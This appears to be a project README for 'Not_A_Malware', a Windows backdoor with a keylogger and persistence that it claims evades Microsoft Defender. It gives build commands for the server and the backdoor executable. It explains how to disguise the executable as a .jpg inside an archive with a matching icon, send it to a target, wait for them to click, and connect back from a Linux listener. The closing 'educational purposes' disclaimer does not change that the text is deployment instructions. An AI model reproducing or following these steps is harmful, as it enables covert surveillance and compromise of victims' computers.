# Not_A_Malware

Well, well, well. Not_A_Malware, is essentially a malware, that uses a backdoor, containg a keylogger, persistence, and many such tools.
This backdoor works exceptionally on latest Windows 10, without getting detected by the Microsoft Defender. This does works on Windows 11, but output varies system to system. 

***How to use the Backdoor***
1) Copy the code for server.c and save it on your machine.
2) Repeat step 1 for all the files, i.e., backdoor.c, function.c, and keylogger.h.
3) Once saved, you're good to go.
4) For compiling server.c file, type in the command on your terminal :- gcc server.c -o server
5) For compiling backdoor.c file, type in the command on your terminal :-  i686-w64-mingw32-gcc -o finalproduct.exe backdoor.c -lwsock32 -lwininet
6) There should be no errors on compiling.
7) On compiling the backdoor.c file, you will get an .exe file, i.e., "finalproduct.exe", this is the backdoor.
8) Transfer the finalproduct.exe to a USB drive. 

**Obfuscating the Backdoor**
1) Transfer the finalproduct.exe from the USB to your windows desktop.
2) Now, depending upon the type of file you want, you can hide the backdoor as a .jpg or.pdf.

**For .jpg backdoor**
1) Have any image on your desktop with .jpg extension.
2) Visit the site https://icoconvert.com/ and upload your image.
3) In icon format, select "ICO for Windows 10, Windows 11, 7 and 8" and tick "64x64" for sizes and tap on "CONVERT ICO", and save the image on your desktop.
4) Move to desktop now, and select finalproduct.exe and the original image file. Now right click on them and choose "Add to Archive" and change the specs as per your requirement.
5) This will create the infectd image file. Share this image file with the target and wait for them to click, to activate the backdoor.
6) To connect to the backdoor, run the command "./server" on your linux terminal.

Note: Make sure to change the IP to your machine's IP. You can check your IP by typing the command "ifconfig" on your terminal. For proper functionality of the code, the IP has to be same for the server.c and backdoor.c file.  

Note: Make sure to use it wisely and refrain from any illegal activities. I strictly condemn any illegeal activity. Use it only for educational purposes.
